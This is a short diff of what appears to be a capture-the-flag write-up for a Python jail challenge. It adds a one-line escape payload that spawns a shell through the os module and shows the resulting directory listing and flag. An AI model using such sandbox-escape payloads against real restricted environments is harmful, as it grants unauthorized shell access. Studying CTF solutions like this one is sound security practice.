@@ -37,6 +37,7 @@ Can You Escape from Here ??
   dig             : Go Deep~
   bomb            : make boooooooomb!!!
 ###############################################
+dig(sys.modules['os'].popen('sh>&2'))
 
 ls
 Impel_Down.py
@@ -73,7 +74,7 @@ dr-xr-xr-x  13 root root          0 Feb  3 05:50 sys
 drwxrwxrwt   2 root root       4096 Feb  4 10:04 tmp
 drwxr-xr-x  10 root root       4096 Feb  2 08:03 usr
 drwxr-xr-x  11 root root       4096 Feb  2 08:04 var
-./F*
+/F*
   G00000000d !! :)
   I think you are familiar with Python !
   FLAG{Pyth0n J@il escape 1s always fun @nd exc1ting ! :)}
